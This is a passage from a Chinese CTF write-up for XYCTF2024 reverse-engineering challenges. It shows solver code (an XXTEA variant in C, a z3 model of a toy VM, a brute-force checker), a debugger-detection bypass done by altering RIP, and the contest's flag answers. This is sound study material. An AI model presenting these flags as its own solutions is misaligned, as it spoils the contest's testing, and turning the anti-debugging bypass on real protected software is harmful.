<span class="keyword">for</span> i <span class="keyword">in</span> YellowFace]),</span><br><span class="line">            <span class="built_in">all</span>([i == <span class="string">&quot;White&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> WhiteFace]),</span><br><span class="line">        ]</span><br><span class="line">    ):</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> result:</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span>.join(res)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([i <span class="keyword">in</span> res <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;Rr&quot;</span>,<span class="string">&quot;rR&quot;</span>,<span class="string">&quot;Uu&quot;</span>,<span class="string">&quot;uU&quot;</span>,<span class="string">&quot;RRR&quot;</span>,<span class="string">&quot;rrr&quot;</span>,<span class="string">&quot;UUU&quot;</span>,<span class="string">&quot;uuu&quot;</span>]]):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    check(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得出flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RuRURURuruRR</span><br><span class="line">RuRURURururr</span><br></pre></td></tr></table></figure>
<h3 id="easy-language">5.17. easy language</h3>
<p>易语言啊 装个易语言插件，可以补全很多函数</p>
<img src="/2024/04/26/XYCTF2024-Writeup/easy_language_AES_ECB.png" class title="easy_language_AES_ECB">
<p>但是我没装中文函数补丁 就只能看j______的函数名了，总之至少看到了AES-ECB加密</p>
<img src="/2024/04/26/XYCTF2024-Writeup/easy_language_%E5%AD%97%E7%AC%A6%E9%9B%86%E6%AF%94%E8%BE%83.png" class title="easy_language_字符集比较">
<p>↑字符集比较</p>
<p>绕过debuger检测：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/easy_language_debuger%E6%A3%80%E6%B5%8B.png" class title="easy_language_debuger检测">
<p>在这里改变RIP就行</p>
<p>找出密文</p>
<img src="/2024/04/26/XYCTF2024-Writeup/easy_language_%E5%AF%86%E6%96%87.png" class title="easy_language_密文">
<p>在比较函数附近内存能看到这个b64的字符串</p>
<img src="/2024/04/26/XYCTF2024-Writeup/easy_language_key.png" class title="easy_language_key">
<p>在aes加密函数附近能找到这个key，动调也能发现IV得0，然后得到flag</p>
<img src="/2024/04/26/XYCTF2024-Writeup/easy_language_flag.png" class title="easy_language_flag">
<h3 id="给阿姨倒一杯卡布奇诺">5.18. 给阿姨倒一杯卡布奇诺</h3>
<p>魔改xxtea，多了个sum+i</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%BB%99%E9%98%BF%E5%A7%A8%E5%80%92%E4%B8%80%E6%9D%AF%E5%8D%A1%E5%B8%83%E5%A5%87%E8%AF%BA.png" class title="给阿姨倒一杯卡布奇诺">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> data1=<span class="number">0x5F797274</span>,data2=<span class="number">0x64726168</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">uint32_t</span> sum; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">uint32_t</span> v1a; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">uint32_t</span> v1; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">uint32_t</span> v0; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sum = <span class="number">1853174124</span>*<span class="number">0x20</span>;</span><br><span class="line">  v0 = v[<span class="number">0</span>];</span><br><span class="line">  v1 = v[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0x1F</span>; i &gt;=<span class="number">0</span>; i-- )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 -= ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (v0 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ (sum + i);</span><br><span class="line">    v0 -= ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (v1 + sum) ^ (*k + <span class="number">16</span> * v1) ^ (sum + i);</span><br><span class="line">    sum -= <span class="number">1853174124</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v0 ^= data1;</span><br><span class="line">  v1 ^= data2;</span><br><span class="line">  data1 = v[<span class="number">0</span>];</span><br><span class="line">  data2 = v[<span class="number">1</span>];</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> key[<span class="number">4</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">uint32_t</span> array[<span class="number">8</span>]; <span class="comment">// [rsp+70h] [rbp-30h]</span></span><br><span class="line">  array[<span class="number">0</span>] = <span class="number">0x9B28ED45</span>;</span><br><span class="line">  array[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">  array[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">  array[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">  array[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">  array[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">  array[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">  array[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">	<span class="built_in">encrypt</span>(array,key);</span><br><span class="line">	<span class="built_in">encrypt</span>(&amp;array[<span class="number">2</span>],key);</span><br><span class="line">	<span class="built_in">encrypt</span>(&amp;array[<span class="number">4</span>],key);</span><br><span class="line">	<span class="built_in">encrypt</span>(&amp;array[<span class="number">6</span>],key);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%X %X &quot;</span>,array[<span class="number">0</span>],array[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%X %X &quot;</span>,array[<span class="number">2</span>],array[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%X %X &quot;</span>,array[<span class="number">4</span>],array[<span class="number">5</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%X %X \n&quot;</span>,array[<span class="number">6</span>],array[<span class="number">7</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%32s&quot;</span>,array);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag:flag{133bffe401d223a02385d90c5f1ca377}</p>
<h3 id="馒头">5.19. 馒头</h3>
<p>手搓哈夫曼树是吧</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E9%A6%92%E5%A4%B4.png" class title="馒头">
<p>然后就，根据字符顺序挨个把权重转化成字符即可</p>
<p>flag：XYCTF{xaf1svut7rojh3de0}</p>
<h3 id="舔狗四部曲–简爱">5.20. 舔狗四部曲–简爱</h3>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E7%AE%80%E7%88%B1.png" class title="舔狗四部曲_简爱">
<p>这里howtolove是个虚拟机，而src是flag{Love_is_not_one_sided_Love}，虽然我上面的tea算法好像是个fake_flag，我没太注意就没管</p>
<p>总之就是输入走howtolove然后和src比较，相等就行了，至于这个虚拟机怎么相等，就交给z3罢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v2 = [<span class="number">0</span>]*<span class="number">1500</span></span><br><span class="line">v2[<span class="number">32</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">65</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">66</span>] = <span class="number">4</span></span><br><span class="line">v2[<span class="number">98</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">99</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">185</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">186</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">187</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">188</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">189</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">190</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">191</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">192</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">193</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">194</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">195</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">196</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">197</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">198</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">199</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">200</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">201</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">202</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">203</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">204</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">205</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">206</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">207</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">208</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">209</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">210</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">211</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">212</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">213</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">214</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">215</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">216</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">217</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">218</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">219</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">220</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">221</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">222</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">223</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">224</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">225</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">226</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">227</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">228</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">229</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">232</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">256</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">257</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">303</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">304</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">305</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">306</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">307</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">308</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">328</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">329</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">330</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">331</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">332</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">333</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">334</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">335</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">336</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">337</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">338</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">339</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">340</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">341</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">342</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">353</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">354</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">430</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">431</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">432</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">523</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">524</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">564</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">565</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">627</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">628</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">629</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">630</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">631</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">632</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">633</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">634</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">635</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">636</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">637</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">638</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">639</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">640</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">641</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">642</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">643</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">644</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">645</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">646</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">647</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">648</span>] = <span class="number">4</span></span><br><span class="line">v2[<span class="number">649</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">650</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">651</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">652</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">653</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">680</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">687</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">688</span>] = <span class="number">4</span></span><br><span class="line">v2[<span class="number">698</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">766</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">767</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">818</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">819</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">820</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">827</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">828</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">846</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">847</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">890</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">891</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">892</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">893</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">894</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">895</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">896</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">897</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">898</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">899</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">900</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">901</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">902</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">903</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">904</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">905</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">906</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">907</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">908</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">909</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">910</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">911</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">912</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">913</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">914</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">915</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">916</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">917</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">918</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">919</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">920</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">921</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">922</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">923</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">924</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">925</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">926</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">927</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">928</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">929</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">930</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">931</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">932</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">933</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">934</span>] = <span class="number">5</span></span><br><span class="line">v2[<span class="number">989</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">994</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">995</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">996</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">997</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">998</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">999</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1000</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1001</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1002</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1003</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1013</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1014</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1015</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1016</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1017</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1018</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1019</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1020</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1021</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1022</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1023</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1024</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1025</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1026</span>] = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1027</span>] = <span class="number">2</span></span><br><span class="line">v2[<span class="number">1028</span>] = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">inp = [BitVec(<span class="string">f&quot;char_<span class="subst">&#123;i&#125;</span>&quot;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">a1 = inp[:]</span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v2:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        a1[v4] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">1</span>:</span><br><span class="line">        a1[v4] -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">2</span>:</span><br><span class="line">        v4 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">4</span>:</span><br><span class="line">        a1[v4]=a1[v4]+a1[v4+<span class="number">1</span>]-<span class="number">70</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">5</span>:</span><br><span class="line">        a1[v4]=a1[v4]-a1[v4+<span class="number">1</span>]+<span class="number">70</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;Love_is_not_one_sided_Love&#125;&quot;</span></span><br><span 